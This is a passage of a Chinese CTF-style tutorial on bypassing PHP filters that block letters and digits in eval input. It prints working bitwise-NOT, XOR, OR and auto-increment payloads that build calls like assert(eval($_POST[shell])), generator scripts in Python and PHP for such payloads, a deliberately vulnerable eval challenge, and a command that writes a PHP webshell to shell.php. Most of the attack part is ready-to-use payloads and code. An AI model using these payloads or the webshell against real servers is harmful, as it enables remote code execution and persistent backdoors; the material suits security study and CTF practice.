<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2);</span><br><span class="line"># %9E%8C%8C%9A%8D%8B : assert</span><br><span class="line"># %DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2 : $_POST[shell]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是也是执行不成功</p>
<p>原因：</p>
<ol>
<li>第一层eval：首先 <code>(~%9E%8C%8C%9A%8D%8B)(~%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2);</code> 先会执行取反函数，得到 <code>(&quot;assert&quot;)(&quot;$_POST[shell]&quot;)</code></li>
<li>第二层assert：注意第二个括号里其实还是字符串，并不是真正的 <code>$_POST[shell]</code> 代码。PHP在解释的时候会找到名为assert的函数，assert会把 <code>$_POST[shell]</code> 变成真正的PHP代码。也就是说现在可以传参过来了，但是却没有执行。</li>
</ol>
<p>那么要想要执行 <code>$_POST[shell]</code>，还要在在前面追加一个 <code>eval</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6);</span><br><span class="line"># %9E%8C%8C%9A%8D%8B : assert</span><br><span class="line"># %9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6 : eval($_POST[shell])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以执行</p>
<ol>
<li>第一层eval：首先 <code>(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6);</code> 先会执行取反函数，得到 <code>(&quot;assert&quot;)(&quot;eval($_POST[shell])&quot;)</code></li>
<li>第二层assert：将字符串 <code>&quot;eval($_POST[shell])&quot;</code> 看作php代码执行</li>
<li>第三层eval：将 <code>$_POST[shell]</code> 传来的数据看作代码执行</li>
</ol>
<h3 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h3><p>在 PHP 中两个字符串异或之后，得到的还是一个字符串。原理是转换为二进制进行异或。如果正则匹配过滤了字母和数字，那就可以使用两个不在正则匹配范围内的非字母非数字的字符进行异或，从而得到我们想要的字符串。</p>
<p>异或（XOR）是一种逻辑运算，它的原理如下：</p>
<p>符号表示： 异或运算用符号 ^ 表示。</p>
<p>定义： 对于两个二进制位，如果相应位相同则结果为 0，如果相应位不同则结果为 1。</p>
<p>下面是异或运算的真值表：</p>
<table>
<thead>
<tr>
<th>A</th>
<th>B</th>
<th>A XOR B</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>1</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>0</td>
</tr>
</tbody></table>
<p>对于整个二进制数，异或运算会对每一位进行独立的操作。</p>
<p>异或的性质：</p>
<blockquote>
<p>交换律： A XOR B 等于 B XOR A<br>结合律： (A XOR B) XOR C 等于 A XOR (B XOR C)<br>自反性： A XOR A 等于 0<br>零元素： A XOR 0 等于 A</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 异或构造Python脚本</span></span><br><span class="line">valid = <span class="string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span></span><br><span class="line"> </span><br><span class="line">answer = <span class="built_in">input</span>(<span class="string">&#x27;输入异或构造的字符串:&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">tmp1, tmp2 = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;&quot;<span class="subst">&#123;tmp1&#125;</span>&quot;^&quot;<span class="subst">&#123;tmp2&#125;</span>&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">phpinfo <span class="string">&quot;0302181&quot;</span>^<span class="string">&quot;@[@[_^^&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//异或php脚本</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;%&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$a</span>[<span class="variable">$i</span>])^<span class="number">0xff</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;^&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$j</span>++)</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;%ff&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//输出：%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;res.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">      <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">          <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">          <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">        <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">        <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">          <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>

<p>先用该脚本生成所有字符异或后的结果，用于下一个脚本的使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">    <span class="keyword">import</span> urllib</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">       s1=<span class="string">&quot;&quot;</span></span><br><span class="line">       s2=<span class="string">&quot;&quot;</span></span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">           f=<span class="built_in">open</span>(<span class="string">&quot;res.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">           <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">               t=f.readline()</span><br><span class="line">               <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">                   <span class="keyword">break</span></span><br><span class="line">               <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">                   <span class="comment">#print(i)</span></span><br><span class="line">                   s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                   s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                   <span class="keyword">break</span></span><br><span class="line">           f.close()</span><br><span class="line">       output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">       <span class="keyword">return</span>(output)</span><br><span class="line">       </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">       param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">       <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>





<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 命令行运行:php yihuo.php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>都是异或脚本</p>
<p>例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//简单例题，flag再phpinfo()中，需要执行php命令：phpinfo();</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$mess</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;mess&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z]/&quot;</span>,<span class="variable">$mess</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;invalid input!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$mess</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//构造payload,字符串phpinfo异或结果为&quot;0302181&quot;^&quot;@[@[_^^&quot;</span></span><br><span class="line"> </span><br><span class="line">mess=<span class="variable">$_</span>=<span class="string">&quot;0302181&quot;</span>^<span class="string">&quot;@[@[_^^&quot;</span>;<span class="variable">$_</span>();</span><br></pre></td></tr></table></figure>





<h3 id="或绕过"><a href="#或绕过" class="headerlink" title="或绕过"></a>或绕过</h3><p>原理和异或绕过类似，只不过用的是|运算符。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">hex_i = <span class="string">&quot;&quot;</span></span><br><span class="line">hex_j = <span class="string">&quot;&quot;</span></span><br><span class="line">pattern=<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>   <span class="comment">#正则过滤的内容</span></span><br><span class="line">str1=[<span class="string">&quot;system&quot;</span>,<span class="string">&quot;dir&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    t1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    t2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> str1[p]:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">if</span> re.search(pattern,<span class="built_in">chr</span>(i)) :</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> re.search(pattern,<span class="built_in">chr</span>(j)) :</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> i &lt; <span class="number">16</span>:</span><br><span class="line">                    hex_i = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    hex_i=<span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">if</span> j &lt; <span class="number">16</span>:</span><br><span class="line">                    hex_j=<span class="string">&quot;0&quot;</span>+<span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    hex_j=<span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">                hex_i=<span class="string">&#x27;%&#x27;</span>+hex_i</span><br><span class="line">                hex_j=<span class="string">&#x27;%&#x27;</span>+hex_j</span><br><span class="line">                c=<span class="built_in">chr</span>(<span class="built_in">ord</span>(urllib.parse.unquote(hex_i))|<span class="built_in">ord</span>(urllib.parse.unquote(hex_j)))</span><br><span class="line">                <span class="keyword">if</span>(c ==k):</span><br><span class="line">                    t1=t1+hex_i</span><br><span class="line">                    t2=t2+hex_j</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(\&quot;&quot;</span>+t1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+t2+<span class="string">&quot;\&quot;)&quot;</span>)</span><br></pre></td></tr></table></figure>





<h3 id="自增绕过"><a href="#自增绕过" class="headerlink" title="自增绕过"></a>自增绕过</h3><p>在编程中，自增操作是指将一个变量的值增加1</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$number</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$number</span>++;  <span class="comment">// 自增操作</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$number</span>;  <span class="comment">// 输出 11</span></span><br></pre></td></tr></table></figure>

<p>自增操作也可以应用于字母</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$letter = &#x27;a&#x27;;</span><br><span class="line">$letter++;  // 自增操作</span><br><span class="line">echo $letter;  // 输出 &#x27;b&#x27;</span><br></pre></td></tr></table></figure>



<p>‘a’++ &#x3D;&gt; ‘b’，’b’++ &#x3D;&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。</p>
<p>那么，如何拿到一个值为字符串’a’的变量呢？</p>
<p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//测试发现7.0.12以上版本不可使用</span><br><span class="line">//使用时需要url编码下</span><br><span class="line">$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</span><br><span class="line">固定格式 构造出来的 assert($_POST[_]);</span><br><span class="line">然后post传入   _=phpinfo();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一样的：</span><br><span class="line">&lt;?php</span><br><span class="line">$_=[].&#x27;&#x27;;   //得到&quot;Array&quot;</span><br><span class="line">$___ = $_[$__];   //得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;</span><br><span class="line">$__ = $___;   //$__=&quot;A&quot;</span><br><span class="line">$_ = $___;   //$_=&quot;A&quot;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到&quot;S&quot;，此时$__=&quot;S&quot;</span><br><span class="line">$___ .= $__;   //$___=&quot;AS&quot;</span><br><span class="line">$___ .= $__;   //$___=&quot;ASS&quot;</span><br><span class="line">$__ = $_;   //$__=&quot;A&quot;</span><br><span class="line">$__++;$__++;$__++;$__++;   //得到&quot;E&quot;，此时$__=&quot;E&quot;</span><br><span class="line">$___ .= $__;   //$___=&quot;ASSE&quot;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__;$__++;   //得到&quot;R&quot;，此时$__=&quot;R&quot;</span><br><span class="line">$___ .= $__;   //$___=&quot;ASSER&quot;</span><br><span class="line">$__++;$__++;   //得到&quot;T&quot;，此时$__=&quot;T&quot;</span><br><span class="line">$___ .= $__;   //$___=&quot;ASSERT&quot;</span><br><span class="line">$__ = $_;   //$__=&quot;A&quot;</span><br><span class="line">$____ = &quot;_&quot;;   //$____=&quot;_&quot;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到&quot;P&quot;，此时$__=&quot;P&quot;</span><br><span class="line">$____ .= $__;   //$____=&quot;_P&quot;</span><br><span class="line">$__ = $_;   //$__=&quot;A&quot;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到&quot;O&quot;，此时$__=&quot;O&quot;</span><br><span class="line">$____ .= $__;   //$____=&quot;_PO&quot;</span><br><span class="line">$__++;$__++;$__++;$__++;   //得到&quot;S&quot;，此时$__=&quot;S&quot;</span><br><span class="line">$____ .= $__;   //$____=&quot;_POS&quot;</span><br><span class="line">$__++;   //得到&quot;T&quot;，此时$__=&quot;T&quot;</span><br><span class="line">$____ .= $__;   //$____=&quot;_POST&quot;</span><br><span class="line">$_ = $$____;   //$_=$_POST</span><br><span class="line">$___($_[_]);   //ASSERT($POST[_])</span><br></pre></td></tr></table></figure>



<h3 id="输出重定向："><a href="#输出重定向：" class="headerlink" title="输出重定向："></a>输出重定向：</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cf568c7.png" alt="image-20240329223733390"></p>
<p>可以写马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo -e &quot;&lt;?php @eval(\$_POST[&#x27;test&#x27;]);?&gt;&quot; &gt; shell.php</span><br></pre></td></tr></table></figure>









<h2 id="无字母数字RCE"><a href="#无字母数字RCE" class="headerlink" title="无字母数字RCE"></a>无字母数字RCE</h2><p>[工具](<a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/bashFuck">ProbiusOfficial&#x2F;bashFuck: exec BashCommand with only ! # $ ‘ ( ) &lt; \ { } just 10 charset used in Bypass or CTF (github.com)</a>)</p>
<h3 id="例1："><a href="#例1：" class="headerlink" title="例1："></a>例1：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/i&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>异或、取反、自增、临时文件上传；都可以</strong></p>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>首先，明确思路。我的核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如“assert”，然后动态执行之即可。</p>
<p>那么，<strong>变换方法</strong> 将是解决本题的要点。</p>
<p>不过在此之前，我需要说说php5和7的差异。</p>
<p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p>
<p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p>
<p>下文为了方便起见，使用PHP5作为环境</p>
<h4 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h4><p>这是最简单、最容易想到的方法。在PHP中，两个字符串执行<strong>异或</strong>操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p>
